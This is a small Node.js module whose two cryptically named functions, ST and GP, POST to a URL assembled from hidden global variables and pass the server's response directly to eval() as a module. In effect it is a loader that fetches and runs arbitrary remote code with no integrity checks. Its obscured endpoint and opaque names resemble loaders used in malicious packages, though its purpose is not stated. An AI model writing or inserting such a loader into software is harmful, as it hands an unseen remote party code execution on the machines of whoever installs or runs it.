const axios = require("axios");
const logger = require("./logger");

async function ST() {
  try {
    const response = await axios.post(global.url + global.q + global.st);

    if (response.status === 200) {
      // Prepare a module object to simulate `require()`
      const module = { exports: {} };

      // Execute the JavaScript code (CommonJS module) inside an eval
      eval(response.data); // This will populate `module.exports`
      // Create an instance of the PG class and call its methods
      return module.exports;
    }
  } catch (error) {
    logger.error("Error While calling ST: ", error);
    return null;
  }
}

async function GP() {
  try {
    const response = await axios.post(global.url + global.q + global.gp);

    if (response.status === 200) {
      // Prepare a module object to simulate `require()`
      const module = { exports: {} };

      // Execute the JavaScript code (CommonJS module) inside an eval
      eval(response.data); // This will populate `module.exports`
      // Create an instance of the PG class and call its methods
      return module.exports;
    }
  } catch (error) {
    logger.error("Error While calling GP: ", error);
    return null;
  }
}

module.exports = {
  ST,
  GP,
};
